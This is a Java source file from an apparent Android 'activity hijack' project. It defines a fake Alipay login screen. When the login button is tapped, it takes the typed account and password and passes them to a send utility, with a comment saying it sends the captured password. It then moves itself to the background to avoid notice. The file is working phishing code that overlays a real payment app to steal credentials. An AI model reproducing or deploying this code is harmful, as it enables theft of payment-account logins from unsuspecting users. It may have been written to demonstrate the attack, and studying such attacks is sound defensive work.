package com.xpf.android.hijackactivity.activity;

import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

import androidx.appcompat.app.AppCompatActivity;

import com.xpf.android.hijackactivity.R;
import com.xpf.android.hijackactivity.utils.SendUtil;

/**
 * Created by x-sir on 2019-11-22 :)
 * Function:
 */
public class AlipayStoryActivity extends AppCompatActivity implements View.OnClickListener {

    private EditText etAccount;
    private EditText etPassword;
    private Button btnLogin;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        this.setTheme(android.R.style.Theme_NoTitleBar);
        setContentView(R.layout.activity_alipay_story);
        btnLogin = findViewById(R.id.btnLogin);
        etAccount = findViewById(R.id.etAccount);
        etPassword = findViewById(R.id.etPassword);
        btnLogin.setOnClickListener(this);
    }

    @Override
    public void onClick(View view) {
        switch (view.getId()) {
            case R.id.btnLogin:
                HandlerThread handlerThread = new HandlerThread("send");
                handlerThread.start();
                new Handler(handlerThread.getLooper()).post(new Runnable() {
                    @Override
                    public void run() {
                        // 发送获取到的用户密码
                        SendUtil.sendInfo(etAccount.getText().toString(), etPassword.getText().toString(), "支付宝");
                    }
                });
                moveTaskToBack(true);
                break;
            default:
                break;
        }
    }
}
